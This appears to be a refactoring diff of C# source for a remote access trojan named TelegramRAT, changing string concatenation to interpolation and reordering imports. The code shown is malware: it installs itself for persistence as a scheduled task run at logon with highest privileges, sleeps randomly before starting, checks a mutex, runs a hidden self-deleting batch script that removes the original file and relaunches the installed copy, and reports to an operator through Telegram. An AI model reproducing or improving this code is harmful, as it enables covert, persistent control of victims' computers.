@@ -7,14 +7,14 @@
 */
 
 using System;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
+using System.Threading;
 using System.Management;
 using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Threading;
+using System.Diagnostics;
 using System.Windows.Forms;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
 
 namespace TelegramRAT
 {
@@ -142,7 +142,7 @@ namespace TelegramRAT
                                 {
                                     Console.WriteLine("[+] Restarting command listener thread");
                                     telegram.waitThreadIsBlocked = false;
-                                    telegram.sendText("🙊 Found blocked process " + process + ".exe");
+                                    telegram.sendText($"🙊 Found blocked process {process}.exe");
                                     break;
                                 }
                                 Thread.Sleep(1000);
@@ -418,14 +418,14 @@ namespace TelegramRAT
         public static void setAutorun()
         {
             Console.WriteLine("[+] Installing to autorun...");
-            TaskSchedulerCommand("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + config.AutorunName + "\" /tr \"" + config.InstallPath + "\"");
+            TaskSchedulerCommand($"/create /f /sc ONLOGON /RL HIGHEST /tn \"{config.AutorunName}\" /tr \"{config.InstallPath}\"");
         }
 
         // Uninstall from startup
         public static void delAutorun()
         {
             Console.WriteLine("[+] Uninstalling from autorun...");
-            TaskSchedulerCommand("/delete /f /tn \"" + config.AutorunName + "\"");
+            TaskSchedulerCommand($"/delete /f /tn \"{config.AutorunName}\"");
         }
 
         // Check mutex
@@ -453,7 +453,7 @@ namespace TelegramRAT
             int sleepTime;
             sleepTime = config.StartDelay * 1000;
             sleepTime = new Random().Next(sleepTime, sleepTime + 3000);
-            Console.WriteLine("[?] Sleeping " + sleepTime);
+            Console.WriteLine($"[?] Sleeping {sleepTime}");
             Thread.Sleep(sleepTime);
         }
 
@@ -475,20 +475,20 @@ namespace TelegramRAT
             using (StreamWriter sw = File.AppendText(batch))
             {
                 sw.WriteLine(":l");
-                sw.WriteLine("Tasklist /fi \"PID eq " + currentPid + "\" | find \":\"");
+                sw.WriteLine($"Tasklist /fi \"PID eq {currentPid}\" | find \":\"");
                 sw.WriteLine("if Errorlevel 1 (");
                 sw.WriteLine(" Timeout /T 1 /Nobreak");
                 sw.WriteLine(" Goto l");
                 sw.WriteLine(")");
-                sw.WriteLine("Del \"" + (new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"");
-                sw.WriteLine("Cd \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
+                sw.WriteLine($"Del \"{(new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name}\"");
+                sw.WriteLine($"Cd \"{Path.GetDirectoryName(config.InstallPath)}\"");
                 sw.WriteLine("Timeout /T 1 /Nobreak");
-                sw.WriteLine("Start \"\" \"" + Path.GetFileName(config.InstallPath) + "\"");
+                sw.WriteLine($"Start \"\" \"{Path.GetFileName(config.InstallPath)}\"");
             }
             // Start
             Process.Start(new ProcessStartInfo() 
             {
-                Arguments = "/C " + batch + " & Del " + batch,
+                Arguments = $"/C {batch} & Del {batch}",
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 FileName = "cmd.exe" 
